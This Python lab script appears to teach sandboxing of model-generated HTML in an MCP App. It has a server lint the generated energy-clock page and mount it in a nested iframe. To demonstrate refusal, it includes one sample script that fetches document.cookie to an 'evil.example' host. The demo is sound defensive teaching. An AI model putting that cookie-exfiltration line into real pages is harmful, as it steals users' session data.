"""MCP Apps · mode 3 · OPEN-ENDED - model-written HTML inside the view, in a nested sandbox.

`generate_energy_view(question)` has the server's model write a whole HTML
document, lints it (common/sandbox.policy_check) and returns it in
structuredContent. The ui://voltpilot/frame.html view never inserts it into its
own DOM: it mounts it in a nested iframe (sandbox="allow-scripts", own CSP).
Two boundaries: host page > sandboxed view > sandboxed generated document.
A button in the generated document reaches the server only after three checks:
the view's message-shape/allow-list check, the host's visibility check, and the
server's argument check.

Run:  python3 labs/03_mcp_apps/open_ended.py [--live]
"""

from __future__ import annotations

import pathlib
import sys

HERE = pathlib.Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parents[1]))
sys.path.insert(0, str(HERE))

import mcp_voltpilot as vp  # noqa: E402
from common import data, fixtures, sandbox  # noqa: E402
from common.llm import collect, get_model, wants_live  # noqa: E402
from common.sse import banner  # noqa: E402
from mcp_server import InProcessHost, MCPServer, text_result, ui_tool  # noqa: E402

URI = "ui://voltpilot/frame.html"
SYSTEM = ("You are VoltPilot. Reply with ONE self-contained HTML document (inline CSS and JS, no network, no forms) "
          "that draws today's energy as a 24-hour radial clock. A button may call "
          "window.voltpilot.action('schedule_ev_charge', {window: '10:30-15:00'}).")
SCRIPT = [{"text": fixtures.energy_clock_html()}]


def make_server(live: bool = False, delay: float = 0.0) -> MCPServer:
    model = get_model(SCRIPT, live, delay)

    def generate_energy_view(args: dict) -> dict:
        html, _ = collect(model.stream([{"role": "user", "content": args.get("question") or data.PROMPT}], system=SYSTEM))
        start = html.lower().find("<!doctype")
        html = html[start:] if start >= 0 else html
        problems = sandbox.policy_check(html)
        if problems:
            return {"content": [{"type": "text", "text": "refused by content policy: " + ", ".join(problems)}], "isError": True}
        return text_result("Generated an energy clock view.", {"title": "Energy clock", "html": html, "bytes": len(html.encode())})

    tools = [ui_tool("generate_energy_view", "Draw today's energy as a custom interactive view.",
                     {"question": {"type": "string"}}, ["question"], resource_uri=URI), vp.SCHEDULE_TOOL]
    return MCPServer("voltpilot-open-ended", tools,
                     {"generate_energy_view": generate_energy_view, "schedule_ev_charge": vp.schedule_handler},
                     {URI: vp.resource("frame.html")})


def http(body: dict, delay: float = 0.0, live: bool = False, sub: str = ""):
    return make_server(live, delay).handle(body) or {}


def main(argv=None) -> int:
    argv = sys.argv[1:] if argv is None else argv
    print(banner("MCP Apps · 3 · open-ended - generated HTML in a nested sandbox"))
    host = InProcessHost(make_server(wants_live(argv)))
    host.connect()
    result = host.rpc("tools/call", {"name": "generate_energy_view", "arguments": {"question": data.PROMPT}})
    sc = result["structuredContent"]
    print(f"\nstructuredContent: title={sc['title']!r}, {sc['bytes']} bytes, policy problems: {sandbox.policy_check(sc['html']) or 'none'}")
    v = host.open_view("generate_energy_view")
    print(f"view {v['uri']} mounts it with: <iframe sandbox=\"allow-scripts\"> + CSP {sandbox.CSP[:52]}...")
    print("\na document that tries to phone home is refused at the server:")
    bad = InProcessHost(_server_with('<!doctype html><script>fetch("https://evil.example/?k="+document.cookie)</script>'), log=lambda *_: None)
    bad.connect()
    r = bad.rpc("tools/call", {"name": "generate_energy_view", "arguments": {"question": "x"}})
    print(f"  isError={r['isError']}: {r['content'][0]['text']}")
    return 0


def _server_with(html: str) -> MCPServer:
    global SCRIPT
    saved, SCRIPT = SCRIPT, [{"text": html}]
    try:
        return make_server()
    finally:
        SCRIPT = saved


if __name__ == "__main__":
    sys.exit(main())
